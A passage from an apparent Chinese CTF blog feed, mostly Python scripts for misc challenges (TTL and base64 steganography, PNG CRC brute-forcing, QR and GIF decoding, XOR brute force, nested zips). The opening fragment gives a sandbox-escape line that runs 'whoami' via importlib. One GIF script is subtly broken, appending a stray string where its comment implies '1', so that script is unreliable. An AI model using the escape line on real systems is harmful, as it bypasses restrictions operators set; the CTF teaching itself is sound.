dangerous</span><br></pre></td></tr></table></figure><p>看起来好像已经非常安全是么？但是，<code>reload(module)</code> 重新加载导入的模块，并执行代码。所以模块被导回到我们的命名空间。</p><p>6、模块导入方式有</p><ul><li>最直接的import.</li><li>内置函数 import</li><li>importlib库</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import importlib</span><br><span class="line">importlib.import_module(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc脚本</title>
      <link href="/article/2022-03-03-misc%E8%84%9A%E6%9C%AC%E5%90%88%E9%9B%86/"/>
      <url>/article/2022-03-03-misc%E8%84%9A%E6%9C%AC%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>主要介绍比赛misc常用的脚本。</p><span id="more"></span><h1 id="1-TTL隐写"><a href="#1-TTL隐写" class="headerlink" title="1.TTL隐写"></a>1.TTL隐写</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">IP报文在路由间穿梭的时候每经过一个路由，TTL就会减1，当TTL为0的时候，该报文就会被丢弃。</span><br><span class="line">TTL所占的位数是8位，也就是0-255的范围，但是在大多数情况下通常只需要经过很小的跳数就能完成报文的转发，</span><br><span class="line">远远比上限255小得多，所以我们可以用TTL值的前两位来进行传输隐藏数据。</span><br><span class="line">如：须传送H字符，只需把H字符换成二进制，每两位为一组，每次填充到TTL字段的开头两位并把剩下的6位设置为1（xx111111），这样发4个IP报文即可传送1个字节。</span><br><span class="line"></span><br><span class="line">根据上述规则，可以知道TTL隐写中用到四个值：</span><br><span class="line">00 111111（63）,01 111111（127）,10 111111（191）,11 111111（255）</span><br><span class="line">解密的时候只取前两位，然后转换成ascii</span><br><span class="line">简化一下，可以这么认为：</span><br><span class="line">00 替换 63</span><br><span class="line">01 替换 127</span><br><span class="line">10 替换 191</span><br><span class="line">11 替换 255</span><br></pre></td></tr></table></figure><p>脚本如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">with open(&#x27;attachment.txt&#x27;,&#x27;r&#x27;) as fp:</span><br><span class="line">    a=fp.readlines()#读取所有的行列</span><br><span class="line">    p=[]</span><br><span class="line">    for x in range(len(a)):</span><br><span class="line">       p.append(int(a[x]))</span><br><span class="line">    s=&#x27;&#x27;</span><br><span class="line">    for i in p:</span><br><span class="line">        if(i==63):</span><br><span class="line">            b=&#x27;00&#x27;</span><br><span class="line">        elif(i==127):</span><br><span class="line">            b=&#x27;01&#x27;</span><br><span class="line">        elif(i==191):</span><br><span class="line">            b=&#x27;10&#x27;</span><br><span class="line">        else:</span><br><span class="line">            b=&#x27;11&#x27;</span><br><span class="line">        s +=b</span><br><span class="line"># print(s)</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(s),8):</span><br><span class="line">    flag += chr(int(s[i:i+8],2))#转字符</span><br><span class="line">flag = binascii.unhexlify(flag)#编码成二进制</span><br><span class="line">#写入文件，没有自动创建</span><br><span class="line">wp = open(&#x27;flag.zip&#x27;,&#x27;wb&#x27;)</span><br><span class="line">wp.write(flag)</span><br><span class="line">wp.close()</span><br></pre></td></tr></table></figure><h1 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h1><p>遇到多层加密需要用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">f=open(&quot;secret.txt&quot;,&quot;r&quot;)</span><br><span class="line">a=f.read()</span><br><span class="line">res=base64.b64decode(a)</span><br><span class="line">while(1):</span><br><span class="line">    res=base64.b64decode(res)</span><br><span class="line">    print(res)</span><br></pre></td></tr></table></figure><p>base64解密并转成文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import  base64</span><br><span class="line">with open(&quot;secret.txt&quot;, &quot;r&quot;) as f:</span><br><span class="line">    imgdata = base64.b64decode(f.read())</span><br><span class="line">    #imgdata = str(f.read())</span><br><span class="line">    file = open(&#x27;5.zip&#x27;, &#x27;wb&#x27;)</span><br><span class="line">    file.write(imgdata)</span><br><span class="line">    file.close()</span><br></pre></td></tr></table></figure><p>base64隐写脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">#base64隐写</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">def get_base64_diff_value(s1, s2):</span><br><span class="line">    print(s1)</span><br><span class="line">    print(s2)</span><br><span class="line">    base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><span class="line">    res = 0</span><br><span class="line">    for i in range(len(s2)):</span><br><span class="line">        if s1[i] != s2[i]:</span><br><span class="line">            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))#返回绝对值</span><br><span class="line">    return res</span><br><span class="line"></span><br><span class="line">def solve_stego():</span><br><span class="line">    with open(&#x27;1.txt&#x27;) as f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = &#x27;&#x27;</span><br><span class="line">        for line in file_lines:</span><br><span class="line">            steg_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;)#从文件中读取出来的字符串，base加密</span><br><span class="line">            # norm_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;).decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).replace(&#x27;\n&#x27;,&#x27;&#x27;)</span><br><span class="line">            norm_line = line.replace(&#x27;\n&#x27;, &#x27;&#x27;).encode(&#x27;utf-8&#x27;)</span><br><span class="line">            norm_line = base64.b64decode(norm_line).decode(&#x27;utf-8&#x27;)#先去解密</span><br><span class="line">            norm_line = base64.b64encode(norm_line.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)#然后加密</span><br><span class="line">            norm_line = norm_line.replace(&#x27;\n&#x27;, &#x27;&#x27;)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)#将字符串传进去取绝对值</span><br><span class="line">            print(diff)</span><br><span class="line">            pads_num = steg_line.count(&#x27;=&#x27;)</span><br><span class="line">            if diff:</span><br><span class="line">                bin_str += bin(diff)[2:].zfill(pads_num * 2)</span><br><span class="line">            else:</span><br><span class="line">                bin_str += &#x27;0&#x27; * pads_num * 2</span><br><span class="line">            print(&#x27;-&#x27; * 10)</span><br><span class="line">            print(bin_str)</span><br><span class="line">            print(goflag(bin_str))</span><br><span class="line">def goflag(bin_str):</span><br><span class="line">    res_str = &#x27;&#x27;</span><br><span class="line">    for i in range(0, len(bin_str), 8):</span><br><span class="line">        res_str += chr(int(bin_str[i:i + 8], 2))</span><br><span class="line">    return res_str</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><h1 id="3-CRC"><a href="#3-CRC" class="headerlink" title="3.CRC"></a>3.CRC</h1><p>图片CRC爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">import zlib</span><br><span class="line">def hexStr2bytes(s):</span><br><span class="line">    b = b&quot;&quot;</span><br><span class="line">    for i in range(0,len(s),2):</span><br><span class="line">        temp = s[i:i+2]</span><br><span class="line">        b +=struct.pack(&quot;B&quot;,int(temp,16))</span><br><span class="line">    return b</span><br><span class="line">str1=&quot;49484452&quot;#Chunk[0] IHDR</span><br><span class="line">str2=&quot;0806000000&quot;#Bit depth、ColorType、Compression method、Filter method、Interlace method</span><br><span class="line">bytes1=hexStr2bytes(str1)</span><br><span class="line">bytes2=hexStr2bytes(str2)</span><br><span class="line">wid,hei = 1308,1280#当前宽高</span><br><span class="line">crc32 = &quot;0x6f03ad71&quot;#图片原来的CRC</span><br><span class="line">for w in range(wid,wid+2000):</span><br><span class="line">    for h in range(hei,hei+2000):</span><br><span class="line">        width = hex(w)[2:].rjust(8,&#x27;0&#x27;)</span><br><span class="line">        height = hex(h)[2:].rjust(8,&#x27;0&#x27;)</span><br><span class="line">        bytes_temp=hexStr2bytes(width+height)</span><br><span class="line">        if eval(hex(zlib.crc32(bytes1+bytes_temp+bytes2))) == eval(crc32):</span><br><span class="line">            print(hex(w),hex(h))</span><br><span class="line">            print(w,h)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>图片crc爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">import datetime</span><br><span class="line">start=datetime.datetime.now()</span><br><span class="line">crcbp = open(&quot;crc1.png&quot;, &quot;rb&quot;).read()</span><br><span class="line">for i in range(2000):</span><br><span class="line">    for j in range(2000):</span><br><span class="line">        data = crcbp[12:16] + struct.pack(&#x27;&gt;i&#x27;, i)+struct.pack(&#x27;&gt;i&#x27;, j)+crcbp[24:29]</span><br><span class="line">        crc32 = binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">        if crc32 == 0x6f03ad71:#图片CRC值</span><br><span class="line">            print(i, j)</span><br><span class="line">            print(&#x27;hex:&#x27;, hex(i), hex(j))</span><br><span class="line">end=datetime.datetime.now()</span><br><span class="line">print(&#x27;Running time: %s Seconds&#x27;%(end-start))</span><br></pre></td></tr></table></figure><h1 id="4-逆序输出文件"><a href="#4-逆序输出文件" class="headerlink" title="4.逆序输出文件"></a>4.逆序输出文件</h1><p>v1版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f1=open(&#x27;task_flag.jpg&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line">f1_len=len(f1)</span><br><span class="line">f2=open(&#x27;tt.jpg&#x27;, &#x27;ab&#x27;)</span><br><span class="line">i=0</span><br><span class="line">while i&lt;f1_len:</span><br><span class="line">    f2.write(f1[i:i+4][::-1])</span><br><span class="line">    i=i+4</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure><p>v2版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from binascii import *</span><br><span class="line">with open(&#x27;what&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">    hex_data = hexlify(f.read()).decode()[::-1]</span><br><span class="line">    with open(&#x27;data.wav&#x27;, &#x27;wb&#x27;) as f1:</span><br><span class="line">        for i in range(0, len(hex_data), 2):</span><br><span class="line">            data = hex_data[i:i+2][::-1]</span><br><span class="line">            f1.write(unhexlify(data))</span><br></pre></td></tr></table></figure><h1 id="5-图片opencv"><a href="#5-图片opencv" class="headerlink" title="5.图片opencv"></a>5.图片opencv</h1><p>YCrCb隐写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import cv2</span><br><span class="line">#需要打开图片的路径，可以是绝对路径或者相对路径，路径中不能出现中文</span><br><span class="line">#读取的彩色图片，是按照 GBR 的形式,数据格式在 0~255</span><br><span class="line">#根据提示不止RGB,opencv中有多种色彩空间，包括 RGB、HSI、HSL、HSV、HSB、YCrCb、CIE XYZ、CIE Lab8种</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">使用函数cv2.imread(filepath,flags)读入一副图片</span><br><span class="line">        filepath：要读入图片的完整路径</span><br><span class="line">        flags：读入图片的标志 </span><br><span class="line">        cv2.IMREAD_COLOR：默认参数，读入一副彩色图片，忽略alpha通道</span><br><span class="line">        cv2.IMREAD_GRAYSCALE：读入灰度图片</span><br><span class="line">        cv2.IMREAD_UNCHANGED：顾名思义，读入完整图片，包括alpha通道</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">imag=cv2.imread(&#x27;2021xihulunjian.png&#x27;)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">用法： cv2.cvtColor(src, code[, dst[, dstCn]])</span><br><span class="line">参数：</span><br><span class="line">src:它是要更改其色彩空间的图像。</span><br><span class="line">code:它是色彩空间转换代码。</span><br><span class="line">dst:它是与src图像大小和深度相同的输出图像。它是一个可选参数。</span><br><span class="line">dstCn:它是目标图像中的频道数。如果参数为0，则通道数自动从src和代码得出。它是一个可选参数。</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">src=cv2.cvtColor(imag,cv2.COLOR_BGR2YCrCb)</span><br><span class="line">Y,Cr,Cb=cv2.split(src)</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">使用函数cv2.imwrite(file，img，num)保存一个图像。</span><br><span class="line">第一个参数是要保存的文件名，第二个参数是要保存的图像。</span><br><span class="line">可选的第三个参数，它针对特定的格式：对于JPEG，其表示的是图像的质量，</span><br><span class="line">用0 - 100的整数表示，默认95;对于png ,第三个参数表示的是压缩级别，默认为3</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">cv2.imwrite(&#x27;./Y.png&#x27;,(Y%2)*255)</span><br><span class="line">cv2.imwrite(&#x27;./Cr.png&#x27;,(Cr%2)*255)</span><br><span class="line">cv2.imwrite(&#x27;./Cb.png&#x27;,(Cb%2)*255)</span><br></pre></td></tr></table></figure><h1 id="6-二维码识别"><a href="#6-二维码识别" class="headerlink" title="6.二维码识别"></a>6.二维码识别</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import qrcode</span><br><span class="line">from PIL import Image</span><br><span class="line">from pyzbar import pyzbar</span><br><span class="line">from bitarray import bitarray</span><br><span class="line">def decode_qr_code(code_img_path):</span><br><span class="line">    if not os.path.exists(code_img_path):</span><br><span class="line">        raise FileExistsError(code_img_path)</span><br><span class="line">    # Here, set only recognize QR Code and ignore other type of code</span><br><span class="line">    return pyzbar.decode(Image.open(code_img_path), symbols=[pyzbar.ZBarSymbol.QRCODE])</span><br><span class="line"></span><br><span class="line">reslut = &#x27;&#x27;</span><br><span class="line">file = r&#x27;1.png&#x27;</span><br><span class="line">data_decode = decode_qr_code(file)</span><br><span class="line">reslut+=data_decode[0].data.decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(reslut)</span><br></pre></td></tr></table></figure><p>二维码识别，并且写入到文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">import pyzbar.pyzbar as pyzbar</span><br><span class="line">import os</span><br><span class="line">def qrcode_parse_content(img_path):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    单张图片的二维码解析</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    img = Image.open(img_path)</span><br><span class="line">    #使用pyzbar解析二维码图片内容</span><br><span class="line">    barcodes = pyzbar.decode(img)</span><br><span class="line">    #打印解析结果，从结果上可以看出，data是识别到的二维码内容，rect是二维码所在的位置</span><br><span class="line">    result = []</span><br><span class="line">    res=[]</span><br><span class="line">    for barcode in barcodes:</span><br><span class="line">        barcode_content = barcode.data.decode(&#x27;utf-8&#x27;)</span><br><span class="line">        barcode_hex=barcode.data</span><br><span class="line">        result.append(barcode_content)</span><br><span class="line">        res.append(barcode_hex)</span><br><span class="line">    return result,res</span><br><span class="line">final=qrcode_parse_content(&#x27;./file.png&#x27;)[1][0]</span><br><span class="line">open(&#x27;test.txt&#x27;,&#x27;wb&#x27;).write(final)    </span><br></pre></td></tr></table></figure><h1 id="7-gif"><a href="#7-gif" class="headerlink" title="7.gif"></a>7.gif</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># 将gif图片转成PNG图片</span><br><span class="line">from PIL import Image</span><br><span class="line">import os</span><br><span class="line">im = Image.open(&#x27;9266eadf353d4ada94ededaeb96d0c50.gif&#x27;)</span><br><span class="line">def iter_frames(im):</span><br><span class="line">    try:</span><br><span class="line">        i = 0</span><br><span class="line">        while 1:</span><br><span class="line">            im.seek(i)</span><br><span class="line">            imframe = im.copy()</span><br><span class="line">            if i == 0:</span><br><span class="line">                palette = imframe.getpalette()</span><br><span class="line">            else:</span><br><span class="line">                imframe.putpalette(palette)</span><br><span class="line">            yield imframe</span><br><span class="line">            i += 1</span><br><span class="line">    except EOFError:</span><br><span class="line">        pass</span><br><span class="line">for i, frame in enumerate(iter_frames(im)):</span><br><span class="line">    frame.save(&#x27;img\\glance&#x27; + str(i) + &#x27;.png&#x27;, **frame.info)</span><br><span class="line"># 最终分割的图片保存形式为：</span><br><span class="line"># 再通过python编程将其组合成对应的一张完整的图片：</span><br><span class="line">IMAGES_PATH = r&#x27;.\img\\&#x27;  # 图片地址</span><br><span class="line">IMAGES_FORMAT = [&#x27;.png&#x27;]  # 图片后缀</span><br><span class="line">IMAGE_SIZE = 2  # 每张小图片的宽度大小</span><br><span class="line">IMAGE_ROW = 600  # 图片的长度</span><br><span class="line">IMAGE_COLUMN = 202  # 图片间隔，也就是合并成一张图后，一共有几列</span><br><span class="line">IMAGE_SAVE_PATH = &#x27;flag.png&#x27;  # 图片转换后的地址</span><br><span class="line">image_names = sorted([name for name in os.listdir(IMAGES_PATH) for item in IMAGES_FORMAT if</span><br><span class="line">                      os.path.splitext(name)[1] == item])</span><br><span class="line">def image_compose():</span><br><span class="line">    to_image = Image.new(&#x27;RGB&#x27;, (IMAGE_COLUMN * IMAGE_SIZE, IMAGE_ROW))  # 创建一个新图</span><br><span class="line">    # 循环遍历，把每张图片按顺序粘贴到对应位置上</span><br><span class="line">    flag = 0</span><br><span class="line">    print(image_names)</span><br><span class="line">    print(len(image_names))</span><br><span class="line">    for name in image_names:</span><br><span class="line">        ph = Image.open(&#x27;img\\&#x27;+name)</span><br><span class="line">        to_image.paste(ph, (flag, 0))</span><br><span class="line">        flag += IMAGE_SIZE</span><br><span class="line">    return to_image.save(IMAGE_SAVE_PATH)  # 保存新图</span><br><span class="line">image_compose()</span><br><span class="line"># 第三步、答案</span><br><span class="line"># 最终我们凭借的图片为：</span><br><span class="line"># ![在这里插入图片描述](https: // img - blog.csdnimg.cn / 20190820170856345.</span><br><span class="line"># png?x - oss - process = image / watermark, type_ZmFuZ3poZW5naGVpdGk, shadow_10, text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2hhcnJ5X2M =, size_16, color_FFFFFF, t_70)</span><br><span class="line"># 至此最终的flag为：TWCTF&#123;BlissbyCharlesORear&#125;</span><br></pre></td></tr></table></figure><p>gif转换成png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from PIL import Image</span><br><span class="line">images=[]</span><br><span class="line">for i in range(10):</span><br><span class="line">    im=Image.open(&#x27;img/frame&#123;&#125;.png&#x27;.format(i+1))</span><br><span class="line">    images.append(im)</span><br><span class="line">images[0].save(&quot;functions.gif&quot;,save_all=True,loop=True,append_images=images[1:],duration=500)</span><br></pre></td></tr></table></figure><p>git转换成png</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def main():</span><br><span class="line">    s=&#x27;&#x27;</span><br><span class="line">    waitr=open(&#x27;gif/0.jpg&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line">    bakle=open(&#x27;gif/1.jpg&#x27;, &#x27;rb&#x27;).read()</span><br><span class="line">    for i in range(0,104):</span><br><span class="line">        a=open(&#x27;./gif/&#123;0&#125;.jpg&#x27;.format(i),&#x27;rb&#x27;).read()</span><br><span class="line">        if a == waitr:</span><br><span class="line">            s+=&#x27;0&#x27;</span><br><span class="line">        if a == bakle:</span><br><span class="line">            s += &#x27;enter_the_pwn_land&#x27;</span><br><span class="line">    print(s)</span><br><span class="line">    read(s)</span><br><span class="line">    #01100110011011000110000101100111011110110100011001110101010011100101111101100111011010010100011001111101</span><br><span class="line">def read(s):</span><br><span class="line">    flag=&#x27;&#x27;</span><br><span class="line">    for i in range(0,int((len(s)/8))):</span><br><span class="line">        flag+=chr(int(s[i*8:(i+1)*8],2))</span><br><span class="line">    print(flag)</span><br><span class="line">    #flag&#123;FuN_giF&#125;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    main()</span><br><span class="line">#黑白图片转成10，然后8位一个字符</span><br></pre></td></tr></table></figure><h1 id="8-xor"><a href="#8-xor" class="headerlink" title="8.xor"></a>8.xor</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line"></span><br><span class="line">b = b64decode(&quot;AAoHAR1TIiIkUFUjUFQgVyInVSVQJVFRUSNRX1YgXiJSVyJQVRs=&quot;)</span><br><span class="line">data = list(b)  # 转成列表</span><br><span class="line">for k in range(200):</span><br><span class="line">    flag = &quot;&quot;</span><br><span class="line">    for i in range(len(data)):</span><br><span class="line">        flag += chr(data[i] ^ k)</span><br><span class="line">    print(flag + &quot;\n&quot;)</span><br></pre></td></tr></table></figure><h1 id="9-循环zip"><a href="#9-循环zip" class="headerlink" title="9.循环zip"></a>9.循环zip</h1><p>循环zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">name = &#x27;0573&#x27;</span><br><span class="line">while True:</span><br><span class="line">    fz = zipfile.ZipFile(&#x27;zip\\&#x27;+name + &#x27;.zip&#x27;, &#x27;r&#x27;)</span><br><span class="line">    fz.extractall(pwd=bytes(name, &#x27;utf-8&#x27;))</span><br><span class="line">    name = fz.filelist[0].filename[0:4]</span><br><span class="line">    fz.close()</span><br></pre></td></tr></table></figure><p>zip转成16进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">f = open(&#x27;file.zip&#x27;, &#x27;rb&#x27;)</span><br><span class="line">i = 0</span><br><span class="line">while True:</span><br><span class="line">    a = f.read(1)</span><br><span class="line">    if not a:</span><br><span class="line">        break</span><br><span class="line">    if i == 16:</span><br><span class="line">        print()</span><br><span class="line">        i = 0</span><br><span class="line">    if i &lt; 15:</span><br><span class="line">        print((&quot;%02x&quot; % (ord(a))+&#x27;&#x27;).upper(),end=&#x27; &#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print((&quot;%02x&quot; % (ord(a))+&#x27;&#x27;).upper(),end=&#x27;&#x27;)</span><br><span class="line">    